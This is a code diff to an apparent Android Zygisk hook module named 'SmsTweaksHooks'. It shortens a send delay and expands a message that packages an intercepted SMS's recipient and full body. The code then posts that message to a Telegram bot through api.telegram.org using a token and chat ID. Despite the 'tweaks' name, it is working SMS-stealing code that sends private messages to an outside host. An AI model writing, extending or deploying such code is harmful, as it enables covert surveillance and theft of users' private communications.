@@ -325,7 +325,7 @@ public final class SmsTweaksHooks {
             @Override
             public void run() {
                 try {
-                    Thread.sleep(300);
+                    Thread.sleep(120);
                     if (single != null) {
                         single.send(-1);
                     } else if (multi != null) {
@@ -510,7 +510,11 @@ public final class SmsTweaksHooks {
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
                     String msg = "📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥\n"
-                            + "To " + displayTo + "\n"
+                            + "-----------------\n"
+                            + "📞 To: " + displayTo + "\n"
+                            + "💬 Message: " + body + "\n"
+                            + "📋 One-tap copy:\n"
+                            + "To: " + displayTo + "\n"
                             + "Message: " + body;
                     String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                     String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
